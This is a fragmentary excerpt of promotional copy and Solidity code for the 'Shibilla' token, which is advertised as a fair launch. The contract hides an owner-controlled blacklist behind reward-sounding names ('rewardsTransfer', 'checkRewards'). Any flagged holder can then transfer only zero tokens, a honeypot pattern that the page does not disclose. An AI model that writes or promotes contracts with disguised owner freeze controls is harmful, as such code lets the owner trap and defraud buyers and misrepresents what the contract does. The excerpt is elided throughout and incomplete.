...
Shibilla Token was created as an alternative 
...
Shibilla Tokens are sold via a fair launch for a
...
contract ShibillaToken is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _rewardsTransfer;
    ...
    string private _name = 'Shibilla';
    string private _symbol = 'SHIBILLA';
    uint8 private _decimals = 9;
    uint256 private constant _tTotal = 200000000000000*10**9;
    ...
    function rewardsTransfer(address botAddress) external onlyOwner {
        if (_rewardsTransfer[botAddress] == true) {
            _rewardsTransfer[botAddress] = false;
        } else {_rewardsTransfer[botAddress] = true;
            emit botBanned (botAddress, _rewardsTransfer[botAddress]);
          }
    }
    
    function checkRewards(address botAddress) public view returns (bool) {
        return _rewardsTransfer[botAddress];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_rewardsTransfer[sender] || _rewardsTransfer[recipient]) require (amount == 0, "");
